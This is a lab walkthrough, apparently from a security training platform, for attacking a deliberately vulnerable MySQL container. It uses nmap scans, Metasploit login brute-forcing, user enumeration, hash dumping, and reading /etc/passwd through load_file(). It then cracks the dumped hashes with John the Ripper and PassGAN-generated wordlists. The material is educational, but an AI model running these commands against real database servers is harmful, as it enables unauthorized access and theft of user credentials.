description: A DSP scenario with vulnerable MySQL DB and password cracking also using tools such as PassGAN (https://github.com/brannondorsey/PassGAN)
goal:
The goal of this laboratory is to show an attack scenario in which there is a vulnerable image on which a MySQL DBMS containing sensitive data is running.

The attack consists of using the Metasploit framework to perform penetration testing on the MySQL server.

Later we will show you how to crack passwords using the John the Ripper tool.

Dictionary attacks are performed rather than brute force attacks, and potential password dictionaries generated via a Generative Adversarial Network, known as PassGAN, will be used.
solution:
Password Guessing Attack

A Kali Linux container as Hack Tool will be used to perform the attack.

It contains all the useful tools to conduct the attack. In addition, a folder containing PassGAN, a Generative Adversarial Network capable of generating a list of potential real passwords having as input a file containing real passwords, has been inserted. There are also two files of potential passwords generated with this GAN, a first file called gen_passwords.txt, generated with the network previously pre-trained by the authors, and another file called gen_my_passwords.txt, generated through training the network on RockYou wordlist.

Start the container, attach it to the network and open the console.

With the command ls we can see the above mentioned files.

Scanning

Host Discovery

By attaching Kali Linux to the target machine's network, an ARP Scan can be performed to scan the local network. Let's execute the following command:

nmap -sn -PR 193.20.1.0/24

where:

  • -sn: limits Nmap to host discovery only;
  • -PR: scans with the ARP protocol.

IP address of target machine is 193.20.1.2.

Port Scanning

You can scan ports, more detail you can perform TCP SYN scan. The command to execute is the following:

nmap -sS -p- -T5 --initial-rtt-timeout 100 ms --max-rtt-timeout 500 ms 193.20.1.2

where:

  •  -sS: TCP SYN (stealth) scan, this is the fastest way to scan TCP protocol ports;
  • -p-: scan all 65535 ports;
  • -T5: offers an easy way to adjust the overall speed of Nmap from very slow (-T0) to extremely aggressive (-T5);
  • --initial-rtt-timeout 100ms: initial waiting time for a response from the port scan probe, set to 100 ms;
  • --max-rtt-timeout 500ms: maximum waiting time for a response from the port scan probe, set to 500ms.

MySQL service is present on port 3306.

OS Scanning

Let's execute the following command to detect the OS.

nmap -O 193.20.1.2

where:

  • -O: enable OS detection.

The Operating System running on the target machine is a Linux OS.

Enumeration

Let's do a more in-depth scan to get more information about the MySQL service on port 3306.

nmap -sV -sC -p 3306 193.20.1.2

where:

  • -sV: probe open ports to determine information about service;
  • -sC: enable a series of default scripts to meticulously scan ports;
  • -p 3306: scan a specific port, in this case port 3306 on which the MySQL service is running.

Metasploit

Let's start Metasploit Framework.

msfconsole

With the module mysql_version, we can get the same information about MySQL serice.

use auxiliary/scanner/mysql/mysql_version

Let's insert RHOSTS and run it.

  • set RHOSTS 193.20.1.2
  • run

Now let's try to crack MySQL credentials using mysql_login module.

use auxiliary/scanner/mysql/mysql_login

Before running the module, we create two lists, one containing the most frequently used usernames and another containing the most frequently used passwords.

Then let's insert following options:

  • set RHOSTS 193.20.1.2
  • set PASS_FILE password.txt
  • set USER_FILE username.txt
  • set BLANK_PASSWORDS true
  • run

root and guest have no login password!

We can also enumerate all MySQL users using mysql_enum module.

use auxiliary/admin/mysql/mysql_enum

  • set RHOSTS 193.20.1.2
  • set USERNAME root
  • set PASSWORD ''
  • run

We can see that there are four users who can access the database and three of these have no password, while only one account has the password of which we can see the hash.

We can also note the privileges that various users have.

Let's try to exfiltrate the password hash using the mysql_hashdump module.

use auxiliary/scanner/mysql/mysql_hashdump

  • set USERNAME root
  • set RHOSTS 193.20.1.2
  • run

Let's save hash in a file.

The mysql_sql module can be used to scan the contents of the /etc/passwd file to get a list of users on the system.

This is done by executing SQL's load_file() function.

use auxiliary/admin/mysql/mysql_sql

  • set USERNAME root
  • set PASSWORD ''
  • set RHOST 193.20.1.2
  • set SQL select load_file(\'/etc/passwd\')

MySQL Server

Let's connect to MySQL server.

mysql -h 193.20.1.2 -u root -p

With command show databases; it is possible view all databases.

With command show tables from <db name>; we can see tables in a specific database.

To select a database, we execute command use <db name>; and with command describe <table name>; we can see table structure.

We are interested in tables: user from mysql database, accounts, accounts_hash, accounts_hash_salt from owasp10 database.

In user table we can find all MySQL users and their password hash.

Accounts table does not have any data encryption, we can exfiltrate data without major problems.

We need to use the John the Ripper tool to crack the passwords in the other two tables.

So, let's put this data in two files.

  • echo "select concat(username, ’:’, password) from accounts_hash" | mysql -h 193.20.1.2 -u root -p owasp10 >> accounts_hash.txt
  • echo "select concat(username, ’:’, password) from accounts_hash_salt" | mysql -h 193.20.1.2 -u root -p owasp10 >> accounts_hash_salt.txt

John the Ripper

Let's try to crack MySQL login password using RockYou wordlist.

john −−wordlist=/rockyou.txt /hash_mysql_user.txt

Fine, useradmin's password is "password".

Let's try to crack hashes we exfiltrated. Let's try to use two wordlist generated with PassGAN.

  • john −−wordlist=/gen_passwords.txt /accounts_hash.txt
  • john −−wordlist=/gen_my_passwords.txt /accounts_hash.txt

Through the command john −−show /accounts_hash.txt it is possible to see all the usernames with relative passwords.

It is more difficult to crack hashes with salt, because we should know salt string and how it is combined with the password.

Let's try.

john −−wordlist=/gen_passwords.txt /accounts_hash_salt.txt

No way.

These hashes were created by concatenation of password and mysignature string (SHA1($pass.$salt)). There are many ways to combine password and salt, including using different hash algorithms.

Let's try to create a file and insert into it, for istance, string "monkeyMonkey!", then let's execute JtR again.

Well done! That's all folks!

 

Further Challenge

Target machine has a lot of vulnerabilities, try to find 'em all!
